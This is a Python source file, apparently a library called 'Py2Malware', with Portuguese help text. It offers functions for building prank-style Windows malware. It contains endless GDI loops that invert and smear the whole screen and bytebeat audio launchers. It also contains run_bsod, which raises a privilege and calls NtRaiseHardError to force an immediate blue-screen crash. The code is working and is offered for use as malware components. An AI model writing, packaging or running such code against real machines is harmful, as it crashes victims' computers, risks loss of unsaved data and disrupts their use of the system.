import ctypes
import win32gui
import math
import time
import win32con
import multiprocessing
import numpy as np
import pyaudio
from bytebeat1 import play_bytebeat1
from bytebeat2 import play_bytebeat2
from bytebeat3 import play_bytebeat3
from bytebeat4 import play_bytebeat4
from bytebeat5 import play_bytebeat5
from bytebeat6 import play_bytebeat6
from bytebeat7 import play_bytebeat7
from bytebeat8 import play_bytebeat8
from bytebeat9 import play_bytebeat9
from bytebeat10 import play_bytebeat10

info = """
(Todos os comandos de gdi não acabam com o computador, por isso podem ser usados livremente)
COMANDOS DA BIBLIOTECA Py2Malware by magyn:
- run_gdi1()
- stop_gdi1()
- run_gdi2()
- stop_gdi1()
- run_gdi3()
- stop_gdi3()
- run_info()
- run_bsod()
- sleep(timehere)
sempre colocar antes if __name__ == "__main__":

from Py2Malware import run_bsod

if __name__ == "__main__":
    run_bsod()
"""

def run_info():
    print(info)

gdi1 = """import win32gui
import ctypes
hdc = win32gui.GetDC(0)
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
while True:
    win32gui.InvertRect(hdc, (0, 0, w ,h))
"""

def run_gdi1_process():
    try:
        exec(gdi1)
    except Exception as e:
        print(f"Erro na execução do gdi1: {e}")

gdi2 = """import ctypes
import win32gui
import math
import time

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
hdc = win32gui.GetDC(0)

# Constants
NOTSRCCOPY = 0x00330008
SRCAND = 0x008800C6

dx1, dy1 = -3, -3
dx2, dy2 = 1, 1
angle = 0
size = 1
speed = 5

try:
    while True:
        win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx1, dy1, NOTSRCCOPY)  # First action
        win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx2, dy2, SRCAND)      # Second action

        dx1 = math.ceil(math.sin(angle) * size * 10)
        dy1 = math.ceil(math.cos(angle) * size * 10)
        dx2 = math.ceil(math.sin(angle) * size * -10)
        dy2 = math.ceil(math.cos(angle) * size * -10)
        angle += speed / 10.0

        if angle > math.pi:
            angle = math.pi * -1

        time.sleep(0.01)  # Add a small delay to prevent high CPU usage

finally:
    win32gui.ReleaseDC(0, hdc)
"""

def run_gdi2_process():
    try:
        exec(gdi2)
    except Exception as e:
        print(f"Erro na execução do gdi2: {e}")

gdi3 = """import win32gui
import win32con
import ctypes

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
hdc = win32gui.GetDC(0)

while True:
    
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -3,-3, win32con.NOTSRCCOPY)"""

def run_gdi3_process():
    try:
        exec(gdi3)
    except Exception as e:
        print(f"Erro na execução do gdi3: {e}")

bsod = """from ctypes import windll, c_uint, POINTER, byref

nullptr = POINTER(c_uint)()

privilege_result = windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_uint()))

if privilege_result != 0:
    print("Erro")
else:
    error_result = windll.ntdll.NtRaiseHardError(0xC000007B, 0, nullptr, nullptr, 6)

    if error_result != 0:
        print("Erro")
"""

def run_bsod_process():
    try:
        exec(bsod)
    except Exception as e:
        print(f"Erro na execução do bsod: {e}")

def stop_gdi1():
    global gdi1_process
    try:
        gdi1_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o gdi1: {e}")

def run_gdi1():
    global gdi1_process
    gdi1_process = multiprocessing.Process(target=run_gdi1_process)
    gdi1_process.start()

def stop_gdi2():
    global gdi2_process
    try:
        gdi2_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o gdi2: {e}")

def run_gdi2():
    global gdi2_process
    gdi2_process = multiprocessing.Process(target=run_gdi2_process)
    gdi2_process.start()

def stop_gdi3():
    global gdi3_process
    try:
        gdi3_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o gdi3: {e}")

def run_gdi3():
    global gdi3_process
    gdi3_process = multiprocessing.Process(target=run_gdi3_process)
    gdi3_process.start()

def run_bsod():
    bsod_process = multiprocessing.Process(target=run_bsod_process)
    bsod_process.start()

def sleep(tempo):
    time.sleep(tempo)

def stop_bb1():
    global bb1_process
    try:
        bb1_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat1: {e}")

def run_bb1():
    global bb1_process
    bb1_process = multiprocessing.Process(target=play_bytebeat1)
    bb1_process.start()

def stop_bb2():
    global bb2_process
    try:
        bb2_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat2: {e}")

def run_bb2():
    global bb2_process
    bb2_process = multiprocessing.Process(target=play_bytebeat2)
    bb2_process.start()

def stop_bb3():
    global bb3_process
    try:
        bb3_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat3: {e}")

def run_bb3():
    global bb3_process
    bb3_process = multiprocessing.Process(target=play_bytebeat3)
    bb3_process.start()

def stop_bb4():
    global bb4_process
    try:
        bb4_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat4: {e}")

def run_bb4():
    global bb4_process
    bb4_process = multiprocessing.Process(target=play_bytebeat4)
    bb4_process.start()

def stop_bb5():
    global bb5_process
    try:
        bb5_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat5: {e}")

def run_bb5():
    global bb5_process
    bb5_process = multiprocessing.Process(target=play_bytebeat5)
    bb5_process.start()

def stop_bb6():
    global bb6_process
    try:
        bb6_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat6: {e}")

def run_bb6():
    global bb6_process
    bb6_process = multiprocessing.Process(target=play_bytebeat6)
    bb6_process.start()

def stop_bb7():
    global bb7_process
    try:
        bb7_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat7: {e}")

def run_bb7():
    global bb7_process
    bb7_process = multiprocessing.Process(target=play_bytebeat7)
    bb7_process.start()

def stop_bb8():
    global bb8_process
    try:
        bb8_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat8: {e}")

def run_bb8():
    global bb8_process
    bb8_process = multiprocessing.Process(target=play_bytebeat8)
    bb8_process.start()

def stop_bb9():
    global bb9_process
    try:
        bb9_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat9: {e}")

def run_bb9():
    global bb9_process
    bb9_process = multiprocessing.Process(target=play_bytebeat9)
    bb9_process.start()

def stop_bb10():
    global bb10_process
    try:
        bb10_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o bytebeat10: {e}")

def run_bb10():
    global bb10_process
    bb10_process = multiprocessing.Process(target=play_bytebeat10)
    bb10_process.start()
